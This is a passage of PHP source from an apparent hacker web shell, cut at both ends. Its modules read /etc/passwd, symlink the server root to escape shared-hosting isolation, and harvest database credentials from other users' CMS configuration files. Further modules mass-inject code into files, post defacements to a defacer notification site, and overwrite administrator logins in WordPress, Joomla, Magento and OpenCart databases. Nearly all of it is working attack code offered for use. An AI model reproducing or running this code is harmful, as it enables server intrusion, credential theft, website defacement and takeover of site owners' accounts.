$db=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

//Other

$db=entre2v2($uxl,"dbpass = \"","\";");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}


}
}
echo "<center>
<a href=\"Exc_symconf/root/\">Root Server</a>
<br><a href=\"Exc_symconf/Passwords.txt\">Passwords</a>
<br><a href=\"Exc_symconf/\">Configurations</a></center>";
}
else
{
echo "<center>
<form method=\"POST\">
<textarea name=\"passwd\" class='area' rows='15' cols='60'>";
$file = '/etc/passwd';
$read = @fopen($file, 'r');
if ($read){
$body = @fread($read, @filesize($file));
echo "".htmlentities($body)."";
}
elseif(!$read)
{
$read = @show_source($file) ;
}
elseif(!$read)
{
$read = @highlight_file($file);
}
elseif(!$read)
{
for($uid=0;$uid<1000;$uid++)
{
$ara = posix_getpwuid($uid);
if (!empty($ara))
{
while (list ($key, $val) = each($ara))
{
print "$val:";
}
print "\n";
}}}

flush();
 
echo "</textarea>
<p><input name=\"m\" size=\"80\" value=\"Start\" type=\"submit\"/></p>
</form></center>";
}
}
}
elseif($_GET['do'] == 'symlink2') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("Exc_sym",0777);
@chdir("Exc_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex Exc.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/Exc_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("Exc_sym",0777);
@chdir("Exc_sym");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex Exc.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/Exc_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("Exc_sym",0777);@chdir("Exc_sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex Exc.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 =
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file =
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/Exc_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }
} elseif($_GET['do'] == 'defacerid') {
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='Unknown1337'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value=' Unknown1337'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
		<input type='submit' name='go' value='Submit' style='width: 450px;'>
		</form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://www.defacer.id/notify";
$data_to_post = array();
$data_to_post['Unknown1337'] = "$hekel";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
} elseif($_GET['do'] == 'vhost') {
	echo "<form method='POST' action=''>";
	echo "<center><br><font size='6'>Bypass Symlink vHost</font><br><br>";
	echo "<center><input type='submit' value='Bypass it' name='Colii'></center>";
		if (isset($_POST['Colii'])){ system('ln -s / Exorcism1337.txt');
			$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
			$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","Exorcism1337.txt");
			$rt="<br><a href=Exorcism1337.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
	Bypassed Successfully</b></font></a>";
	echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt</center>";} echo "</form>";
} elseif($_GET['do'] == 'config') {
	$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
	$idx = mkdir("Exc_config", 0777);
	$isi_htc = "Options all\nRequire None\nSatisfy Any";
	$htc = fopen("Exc_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $user_Exc) {
				$user_config_dir = "/home/$user_Exc/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$user_Exc/.my.cnf" => "cpanel",
						"/home/$user_nonme/.accesshash" => "WHM-accesshash",
						"/home/$user_Exc/public_html/vdo_config.php" => "Voodoo",
						"/home/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
						"/home/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
						"/home/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
						"/home/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
						"/home/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
						"/home/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
						"/home/$user_Exc/public_html/forum/config.php" => "phpBB",
						"/home/$user_Exc/public_html/sites/default/settings.php" => "Drupal",
						"/home/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
						"/home/$user_Exc/public_html/app/etc/local.xml" => "Magento",
						"/home/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
						"/home/$user_Exc/public_html/configuration.php" => "Joomla",
						"/home/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
						"/home/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
						"/home/$user_Exc/public_html/wp-config.php" => "WordPress",
						"/home/$user_Exc/public_html/admin/config.php" => "OpenCart",
						"/home/$user_Exc/public_html/slconfig.php" => "Sitelok",
						"/home/$user_Exc/public_html/application/config/database.php" => "Ellislab");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("Exc_config/$user_Exc-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	echo "<center><a href='?dir=$dir/Exc_config'><font color=lime>Done</font></a></center>";
} elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
			foreach($user_jumping[1] as $user_Exc_jump) {
				$user_jumping_dir = "/home/$user_Exc_jump/public_html";
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					}
					echo $jrw;
					if(function_exists('posix_getpwuid')) {
						$domain_jump = file_get_contents("/etc/named.conf");	
						if($domain_jump == '') {
							echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
						} else {
							preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
							foreach($domains_jump[1] as $dj) {
								$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
								$user_jumping_url = $user_jumping_url['name'];
								if($user_jumping_url == $user_Exc_jump) {
									echo " => ( <u>$dj</u> )<br>";
									break;
								}
							}
						}
					} else {
						echo "<br>";
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre>";
} elseif($_GET['do'] == 'hash') {
 $submit = $_POST['enter'];
   
 if (isset($submit)) {
     
   $pass = $_POST['password']; // password
      
  $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
 
     $hash = md5($pass); // md5 hash #1
     
   $md4 = hash("md4", $pass);
        $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
   
     $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
     
   $hash1 = sha1($pass); // sha1 hash #4
        $sha256 = hash("sha256", $text);
     
   $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
       
 $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
     
   
    }
    echo '<form action="" method="post"><b> ';
    echo '<center><h2><b>-=[ Password Hash]=-</b></h2></center></tr>';
   	echo ' <b>masukan kata yang ingin di encrypt:</b> ';
  	echo ' <input class="inputz" type="text" name="password" size="40" />';
   	echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';
  	echo ' <br>';
    echo '</th></center></tr>';
 	echo 'Hasil Hash: <br><br>';
   	echo ' Original Password <br>  <input class=inputz type=text size=50 value=' . $pass . '> <br><br>';
   	echo ' MD5 <br> <input class=inputz type=text size=50 value=' . $hash . '> <br><br>';
	echo ' MD4 <br> <input class=inputz type=text size=50 value=' . $md4 . '> <br><br>';
	echo ' MD5 with Salt <br>  <input class=inputz type=text size=50 value=' . $hash_md5 . '> <br><br>';
    echo ' MD5 with Salt & Sha1 <br>  <input class=inputz type=text size=50 value=' . $hash_md5_double . '> <br><br>';
    echo ' Sha1 <br>  <input class=inputz type=text size=50 value=' . $hash1 . '> <br><br>';
 	echo ' Sha256 <br> <input class=inputz type=text size=50 value=' . $sha256 . '> <br><br>';
 	echo ' Sha1 with Salt <br>  <input class=inputz type=text size=50 value=' . $hash1_sha1 . '> <br><br>';
 	echo ' Sha1 with Salt & MD5 <br> <input class=inputz type=text size=50 value=' . $hash1_sha1_double . '> <br><br>';

} elseif($_GET['do'] == 'code') {
echo '<center><h1>Mass Code Injector</h1></center>';
    echo '<div class="content">';
    
    if(stristr(php_uname(),"Windows")) { $DS = "\\"; } else if(stristr(php_uname(),"Linux")) { $DS = '/'; }
    function get_structure($path,$depth) {
        global $DS;
        $res = array();
        if(in_array(0, $depth)) { $res[] = $path; }
        if(in_array(1, $depth) or in_array(2, $depth) or in_array(3, $depth)) {
            $tmp1 = glob($path.$DS.'*',GLOB_ONLYDIR);
            if(in_array(1, $depth)) { $res = array_merge($res,$tmp1); }
        }
        if(in_array(2, $depth) or in_array(3, $depth)) {
            $tmp2 = array();
            foreach($tmp1 as $t){
                $tp2 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp2 = array_merge($tmp2, $tp2);
            }
            if(in_array(2, $depth)) { $res = array_merge($res,$tmp2); }
        }
        if(in_array(3, $depth)) {
            $tmp3 = array();
            foreach($tmp2 as $t){
                $tp3 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp3 = array_merge($tmp3, $tp3);
            }
            $res = array_merge($res,$tmp3);
        }
        return $res;
    }

    if(isset($_POST['submit']) && $_POST['submit']=='Inject') {
        $name = $_POST['name'] ? $_POST['name'] : '*';
        $type = $_POST['type'] ? $_POST['type'] : 'html';
        $path = $_POST['path'] ? $_POST['path'] : getcwd();
        $code = $_POST['code'] ? $_POST['code'] : 'Pakistan Haxors Crew';
        $mode = $_POST['mode'] ? $_POST['mode'] : 'a';
        $depth = sizeof($_POST['depth']) ? $_POST['depth'] : array('0');
        $dt = get_structure($path,$depth);
        foreach ($dt as $d) {
            if($mode == 'a') {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code, FILE_APPEND)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:lime;"> was injected</span></div>';
                } else {
                    echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
                }
            } else {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:lime;"> was injected</span></div>';
                } else {
                    echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
                }
            }        
        }
    } else {
        echo '<form method="post" action="">
                <table align="center">
                    <tr>
                        <td>Directory : </td>
                        <td><input class="box" name="path" value="'.getcwd().'" size="50"/></td>
                    </tr>
                    <tr>
                        <td class="title">Mode : </td>
                        <td>
                            <select style="width: 100px;" name="mode" class="box">
                                <option value="a">Apender</option>
                                <option value="w">Overwriter</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td class="title">File Name & Type : </td>
                        <td>
                            <input type="text" style="width: 100px;" name="name" value="*"/>&nbsp;&nbsp;
                            <select style="width: 100px;" name="type" class="box">
                            <option value="html">HTML</option>
                            <option value="htm">HTM</option>
                            <option value="php" selected="selected">PHP</option>
                            <option value="asp">ASP</option>
                            <option value="aspx">ASPX</option>
                            <option value="xml">XML</option>
                            <option value="txt">TXT</option>
                        </select></td>
                    </tr>
                    <tr>
                        <td class="title">Code Inject Depth : </td>
                        <td>
                            <input type="checkbox" name="depth[]" value="0" checked="checked"/>&nbsp;0&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="1"/>&nbsp;1&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="2"/>&nbsp;2&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="3"/>&nbsp;3
                        </td>
                    </tr>        
                    <tr>
                        <td colspan="2"><textarea name="code" cols="70" rows="10" class="box"></textarea></td>
                    </tr>                        
                    <tr>
                        <td colspan="2" style="text-align: center;">
                            <input type="hidden" name="a" value="Injector">
                            <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
                            <input type="hidden" name="p1">
                            <input type="hidden" name="p2">
                            <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
                            <input style="padding :5px; width:100px;" name="submit" type="submit" value="Inject"/></td>
                    </tr>
                </table>
        </form>';
    }
    echo '</div>';

} elseif($_GET['do'] == 'hashid') {
if (isset($_POST['gethash'])) {
        $hash = $_POST['hash'];
        if (strlen($hash) == 32) {
            $hashresult = "MD5 Hash";
        } elseif (strlen($hash) == 40) {
            $hashresult = "SHA-1 Hash/ /MySQL5 Hash";
        } elseif (strlen($hash) == 13) {
            $hashresult = "DES(Unix) Hash";
        } elseif (strlen($hash) == 16) {
            $hashresult = "MySQL Hash / /DES(Oracle Hash)";
        } elseif (strlen($hash) == 41) {
            $GetHashChar = substr($hash, 40);
            if ($GetHashChar == "*") {
                $hashresult = "MySQL5 Hash";
            }
        } elseif (strlen($hash) == 64) {
            $hashresult = "SHA-256 Hash";
        } elseif (strlen($hash) == 96) {
            $hashresult = "SHA-384 Hash";
        } elseif (strlen($hash) == 128) {
            $hashresult = "SHA-512 Hash";
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$1$')) {
                $hashresult = "MD5(Unix) Hash";
            }
        } elseif (strlen($hash) == 37) {
            if (strstr($hash, '$apr1$')) {
                $hashresult = "MD5(APR) Hash";
            }
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$H$')) {
                $hashresult = "MD5(phpBB3) Hash";
            }
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$P$')) {
                $hashresult = "MD5(Wordpress) Hash";
            }
        } elseif (strlen($hash) == 39) {
            if (strstr($hash, '$5$')) {
                $hashresult = "SHA-256(Unix) Hash";
            }
        } elseif (strlen($hash) == 39) {
            if (strstr($hash, '$6$')) {
                $hashresult = "SHA-512(Unix) Hash";
            }
        } elseif (strlen($hash) == 24) {
            if (strstr($hash, '==')) {
                $hashresult = "MD5(Base-64) Hash";
            }
        } else {
            $hashresult = "Hash type not found";
        }
    } else {
        $hashresult = "Not Hash Entered";
    }
?>
	<center><br><Br><br>
	
		<form action="" method="POST">
		<tr>
		<table >
		<th colspan="5">Hash Identification</th>
		<tr class="optionstr"><B><td>Enter Hash</td></b><td>:</td>	<td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
		<tr class="optionstr"><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
	</table></tr></form>
	</center>
<?php
} elseif($_GET['do'] == 'auto_edit_user') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='Unknown1337' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='Unknown1337' placeholder='pass_baru'><br>
